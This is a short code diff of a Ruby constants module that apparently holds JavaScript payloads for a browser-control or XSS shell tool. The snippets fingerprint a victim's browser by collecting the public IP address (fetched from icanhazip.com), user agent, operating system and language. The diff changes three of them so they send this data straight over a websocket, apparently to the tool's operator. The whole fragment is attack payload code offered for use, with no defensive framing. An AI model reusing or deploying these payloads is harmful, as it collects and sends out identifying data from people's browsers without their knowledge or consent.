@@ -30,9 +30,9 @@ module Constants
         "IP" => "var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() 
         { if (xhttp.readyState == 4 && xhttp.status == 200) { ws.send(\"IP Address: \" + xhttp.responseText); }};
         xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", true);xhttp.send();",
-        "USER_AGENT" => "return \"User agent: \" + navigator.appVersion;",
-        "OPERATING_SYSTEM" => "return \"OS: \" + navigator.platform;",
-        "LANGUAGE" => "return \"Language: \" + navigator.language;"
+        "USER_AGENT" => "ws.send(\"User agent: \" + navigator.appVersion);",
+        "OPERATING_SYSTEM" => "ws.send(\"OS: \" + navigator.platform);",
+        "LANGUAGE" => "ws.send(\"Language: \" + navigator.language);"
     }.sort
     def Constants.getWelcomeMessage()
         return @welcomeMessage
